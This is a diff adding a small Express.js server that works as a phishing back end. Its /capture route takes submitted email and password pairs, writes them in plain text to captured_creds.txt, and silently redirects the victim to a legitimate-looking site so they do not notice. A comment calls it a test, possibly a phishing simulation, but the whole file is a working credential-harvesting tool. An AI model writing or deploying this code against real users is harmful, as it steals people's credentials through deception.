@@ -1,0 +1,24 @@
+const express = require('express');
+const fs = require('fs');
+const app = express();
+
+// Middleware to parse URL-encoded form data
+app.use(express.urlencoded({ extended: true }));
+
+// Handle the form submission
+app.post('/capture', (req, res) => {
+    const { email, password } = req.body;
+    const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;
+
+    // Note the captured credentials to a local file
+    fs.appendFile('captured_creds.txt', logEntry, (err) => {
+        if (err) console.error('Error saving credentials', err);
+    });
+
+    // Redirect the user to the real service so they don't realize it was a test
+    res.redirect('https://www.example.com');
+});
+
+app.listen(3000, () => {
+    console.log('Capture server running on port 3000');
+});
